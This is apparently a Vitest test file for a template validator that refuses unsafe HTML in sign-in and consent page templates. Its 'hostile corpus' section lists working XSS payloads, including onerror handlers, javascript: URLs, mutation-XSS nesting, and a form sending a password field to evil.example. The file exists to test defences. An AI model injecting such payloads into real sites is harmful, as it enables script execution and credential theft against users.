import { PAGE_KINDS } from '@odudu/kernel';
import { describe, expect, it } from 'vitest';
import { checkTemplate } from '#/service/template';

const SIGN_IN =
  '<div class="card"><h1>{{t "login.title"}}</h1>{{form.open}}{{fields}}{{submit}}{{form.close}}</div>';

const codes = (template: string, options?: Parameters<typeof checkTemplate>[2]): string[] =>
  checkTemplate('sign-in', template, options).map((issue) => issue.code);

const refused = (template: string): boolean => checkTemplate('sign-in', template).length > 0;

// A sign-in template that is otherwise valid with `fragment` added to it.
const withFragment = (fragment: string): string => `${SIGN_IN}${fragment}`;

describe('checkTemplate', () => {
  it('accepts a minimal sign-in template', () => {
    expect(checkTemplate('sign-in', SIGN_IN)).toEqual([]);
  });

  it('accepts optional parts once and the allowed attributes', () => {
    const template = withFragment(
      '<p lang="en" dir="ltr" role="note" aria-label="x" class="a">{{error}}</p>' +
        '<a href="https://example.com/help" rel="noopener noreferrer" class="l">Help</a>',
    );
    expect(checkTemplate('sign-in', template)).toEqual([]);
  });

  it.each([
    'script',
    'style',
    'link',
    'meta',
    'base',
    'iframe',
    'object',
    'embed',
    'form',
    'input',
    'button',
    'select',
    'textarea',
    'svg',
    'math',
    'template',
    'noscript',
    'frame',
    'frameset',
    'applet',
    'portal',
    'dialog',
    'x-widget',
    'details',
    'video',
  ])('refuses <%s>', (tag) => {
    expect(codes(withFragment(`<${tag}></${tag}>`))).toContain('element-not-allowed');
  });

  it('refuses an unrecognised element rather than passing it', () => {
    expect(codes(withFragment('<blink>hi</blink>'))).toEqual(['element-not-allowed']);
  });

  it('refuses an allowed tag name in a foreign namespace', () => {
    expect(codes(withFragment('<svg><a href="https://x.example">x</a></svg>'))).toContain(
      'element-not-allowed',
    );
  });

  it('refuses a slot inside href', () => {
    const template = withFragment('<a href="{{links}}" rel="noopener noreferrer">x</a>');
    expect(codes(template)).toContain('slot-in-attribute');
  });

  it('refuses a slot in any attribute value, name or comment', () => {
    expect(codes(withFragment('<p class="a {{error}}">x</p>'))).toContain('slot-in-attribute');
    expect(codes(withFragment('<p data-{{error}}="1">x</p>'))).toContain('slot-in-attribute');
    expect(codes(withFragment('<!-- {{error}} -->'))).toContain('comment');
  });

  it('refuses on* and style attributes', () => {
    expect(codes(withFragment('<p onclick="x()">a</p>'))).toContain('attribute-not-allowed');
    expect(codes(withFragment('<p ONMOUSEOVER="x()">a</p>'))).toContain('attribute-not-allowed');
    expect(codes(withFragment('<p style="color:red">a</p>'))).toContain('attribute-not-allowed');
    expect(codes(withFragment('<p id="a" title="b" data-x="c">a</p>'))).toEqual([
      'attribute-not-allowed',
      'attribute-not-allowed',
      'attribute-not-allowed',
    ]);
  });

  it('refuses a javascript: and an http: href, accepts https with rel', () => {
    const link = (href: string, rel = ' rel="noopener noreferrer"'): string =>
      withFragment(`<a href="${href}"${rel}>x</a>`);
    expect(codes(link('javascript:alert(1)'))).toContain('href-not-https');
    expect(codes(link('JaVaScRiPt:alert(1)'))).toContain('href-not-https');
    expect(codes(link(' javascript:alert(1)'))).toContain('href-not-https');
    expect(codes(link('java&#9;script:alert(1)'))).toContain('href-not-https');
    expect(codes(link('http://example.com'))).toContain('href-not-https');
    expect(codes(link('/relative'))).toContain('href-not-https');
    expect(codes(link('data:text/html,x'))).toContain('href-not-https');
    expect(codes(link('https://example.com'))).toEqual([]);
    expect(codes(link('HTTPS://example.com'))).toEqual([]);
    expect(codes(link('https://example.com', ''))).toContain('link-rel');
    expect(codes(link('https://example.com', ' rel="noopener"'))).toContain('link-rel');
    expect(codes(withFragment('<a rel="noopener noreferrer">x</a>'))).toContain('href-not-https');
  });

  it('img src must be an asset URL of the theme', () => {
    const img = '<img src="/theme-assets/abc.png" alt="Logo">';
    const isAssetUrl = (url: string): boolean => url.startsWith('/theme-assets/');
    expect(codes(withFragment(img))).toContain('img-src');
    expect(codes(withFragment(img), { isAssetUrl })).toEqual([]);
    expect(
      codes(withFragment('<img src="https://evil.example/x.png" alt="x">'), { isAssetUrl }),
    ).toContain('img-src');
    expect(codes(withFragment('<img src="/theme-assets/abc.png">'), { isAssetUrl })).toContain(
      'img-alt',
    );
    expect(codes(withFragment('<img alt="x">'), { isAssetUrl })).toContain('img-src');
    expect(
      codes(withFragment('<img src="/theme-assets/a.png" alt="" srcset="x 1x">'), { isAssetUrl }),
    ).toContain('attribute-not-allowed');
  });

  it('refuses a missing required part and a doubled one', () => {
    expect(codes('<p>{{t "x"}}</p>')).toEqual([
      'missing-part',
      'missing-part',
      'missing-part',
      'missing-part',
    ]);
    expect(codes(withFragment('{{submit}}'))).toEqual(['repeated-part']);
    expect(codes(withFragment('{{error}}{{error}}'))).toEqual(['repeated-part']);
  });

  it('refuses an unknown slot, a slot of another kind and a malformed one', () => {
    expect(codes(withFragment('{{nope}}'))).toEqual(['unknown-slot']);
    expect(codes(withFragment('{{submit.allow}}'))).toEqual(['unknown-slot']);
    expect(codes(withFragment('{{ error }}'))).toContain('malformed-slot');
    expect(codes(withFragment('{{t foo}}'))).toContain('malformed-slot');
    expect(codes(withFragment('}}'))).toContain('malformed-slot');
  });

  it('refuses a slot inside a raw-text element', () => {
    for (const tag of ['title', 'textarea', 'style', 'script', 'noscript', 'xmp', 'iframe']) {
      expect(codes(withFragment(`<${tag}>{{error}}</${tag}>`)), tag).toContain('slot-in-raw-text');
    }
  });

  it('refuses a slot inside a raw-text element of the svg namespace', () => {
    for (const tag of ['style', 'script', 'title']) {
      expect(codes(withFragment(`<svg><${tag}>{{error}}</${tag}></svg>`)), tag).toContain(
        'slot-in-raw-text',
      );
    }
  });

  it('refuses an entity-encoded slot', () => {
    expect(codes(withFragment('<p>&#123;&#123;error&#125;&#125;</p>'))).not.toEqual([]);
    expect(codes(withFragment('<p>&lbrace;&lbrace;error&rbrace;&rbrace;</p>'))).not.toEqual([]);
    expect(codes(withFragment('<p class="&#123;&#123;error&#125;&#125;">a</p>'))).toContain(
      'slot-in-attribute',
    );
  });

  it('refuses a slot split across nodes', () => {
    expect(codes(withFragment('<p>{{err<b>or}}</p>'))).toContain('malformed-slot');
  });

  it('rejects over-size and over-slot-count', () => {
    expect(codes(`${SIGN_IN}${'<p>x</p>'.repeat(10_000)}`)).toEqual(['too-large']);
    const many = `${SIGN_IN}${'{{t "a.b"}}'.repeat(200)}`;
    expect(codes(many)).toEqual(['too-many-slots']);
    expect(codes(`${SIGN_IN}${'{{t "a.b"}}'.repeat(190)}`)).toEqual([]);
  });

  it('checks the manifest of the kind it is given', () => {
    const consent = '{{form.open}}{{scopes}}{{submit.allow}}{{submit.deny}}{{form.close}}{{error}}';
    expect(checkTemplate('consent', consent)).toEqual([]);
    expect(checkTemplate('sign-in', consent).map((issue) => issue.code)).toContain('unknown-slot');
  });

  it('accepts a minimal template for every kind', () => {
    for (const [kind, manifest] of Object.entries(PAGE_KINDS)) {
      const template = manifest.required.map((name) => `<p>{{${name}}}</p>`).join('');
      expect(checkTemplate(kind as keyof typeof PAGE_KINDS, template), kind).toEqual([]);
    }
  });
});

describe('hostile corpus', () => {
  const payloads: string[] = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)" alt="x">',
    '<a href="JaVaScRiPt:alert(1)" rel="noopener noreferrer">x</a>',
    '<a href="&#106;avascript:alert(1)" rel="noopener noreferrer">x</a>',
    '<a href="vbscript:msgbox(1)" rel="noopener noreferrer">x</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD4=" rel="noopener noreferrer">x</a>',
    '<svg onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><style>@import url(//evil.example/x.css)</style></svg>',
    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    '<form action="https://evil.example"><input name="password"></form>',
    '<form><form><input></form></form>',
    '<base href="https://evil.example/">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<style>@import "//evil.example/x.css";</style>',
    '<p style="width:expression(alert(1))">x</p>',
    '<p style="background:url(javascript:alert(1))">x</p>',
    '<iframe src="https://evil.example"></iframe>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<object data="x.swf"></object>',
    '<embed src="x.swf">',
    '<button formaction="https://evil.example">x</button>',
    '<input type="image" src="x" onerror="alert(1)">',
    '<select><option>x</option></select>',
    '<textarea>x</textarea>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>',
    '<p><svg><style><a id="</style><img src=x onerror=alert(1)>"></p>',
    '<template><script>alert(1)</script></template>',
    '<details open ontoggle=alert(1)>x</details>',
    '<div onpointerenter="alert(1)">x</div>',
    '<x-evil onclick="alert(1)">x</x-evil>',
    '<p><a href="https://example.com" onclick="alert(1)" rel="noopener noreferrer">x</a></p>',
    '<a href="https://example.com">no rel</a>',
    '<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>',
    '<!--[if IE]><script>alert(1)</script><![endif]-->',
    '<![CDATA[<script>alert(1)</script>]]>',
    '<plaintext>x',
    '<xmp><script>alert(1)</script></xmp>',
    '<marquee onstart=alert(1)>x</marquee>',
    '<video><source onerror=alert(1)></video>',
    '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
    '<div id="x" class="y">clobber</div>',
    '<img src="https://evil.example/pixel.gif" alt="">',
    '<p>{{script}}</p>',
    '<p class="{{error}}">x</p>',
    '<p>&#60;script&#62;</p><script>x</script>',
  ];

  it('has at least 25 payloads', () => {
    expect(payloads.length).toBeGreaterThanOrEqual(25);
  });

  it.each(payloads)('refuses %s', (payload) => {
    expect(refused(withFragment(payload))).toBe(true);
  });
});
